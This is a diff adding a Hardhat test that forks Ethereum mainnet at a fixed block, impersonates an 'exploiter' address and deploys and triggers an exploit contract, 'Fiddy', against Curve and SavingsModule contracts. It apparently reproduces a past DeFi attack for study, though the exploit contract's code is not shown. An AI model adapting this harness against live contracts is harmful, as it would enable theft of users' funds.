@@ -1,0 +1,42 @@
+const { assert } = require("chai");
+const [addresses, forkFrom, impersonate] = require('../utils/utils.js');
+hre.tracer.nameTags["0x7967ada2a32a633d5c055e2e075a83023b632b4e"] = "Curve yPool";
+hre.tracer.nameTags["0x73fC3038B4cD8FfD07482b92a52Ea806505e5748"] = "SavingsModule";
+hre.tracer.nameTags["0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3"] = "Curve yDeposit";
+hre.tracer.nameTags["0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51"] = "Curve ySwap";
+hre.tracer.nameTags["0x0000000000000000000000000000000000000000"] = "Zero Address";
+hre.tracer.nameTags["0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01"] = "yDai";
+hre.tracer.nameTags["0x6b175474e89094c44da98b954eedeac495271d0f"] = "Dai";
+hre.tracer.nameTags["0xd6ad7a6750a7593e092a9b218d66c0a814a3436e"] = "yUSDC";
+hre.tracer.nameTags["0x83f798e925bcd4017eb265844fddabb448f1707d"] = "yUSDT";
+hre.tracer.nameTags["0x73a052500105205d34daf004eab301916da8190f"] = "yTUSD";
+hre.tracer.nameTags["0xdf5e0e81dff6faf3a7e52ba697820c5e32d806a8"] = "yCRV";
+hre.tracer.nameTags["0x2afa3c8bf33e65d5036cd0f1c3599716894b3077"] = "dyPool";
+hre.tracer.nameTags["0xFA712EE4788C042e2B7BB55E6cb8ec569C4530c1"] = "yCRVGuage";
+
+describe("Exploit", function() {
+
+  it("Should return the new greeting once it's changed", async function() {
+
+    forkFrom(11242695);
+      
+    impersonate(addresses.exploiter);
+    const attacker = ethers.provider.getSigner(addresses.exploiter);
+  
+    // We get the contract to deploy
+    const Fiddy = await ethers.getContractFactory("Fiddy");
+    //const val = ethers.utils.parseEther(1).toString();
+    const fiddy = await Fiddy.deploy();
+    console.log("Exploit deployed to:", fiddy.address);
+
+    attacker.sendTransaction({
+        to: fiddy.address,
+        value: 10
+    });
+    
+    await fiddy.test({gasLimit: 22000000, gasPrice: 99});
+
+  });  
+  
+
+});
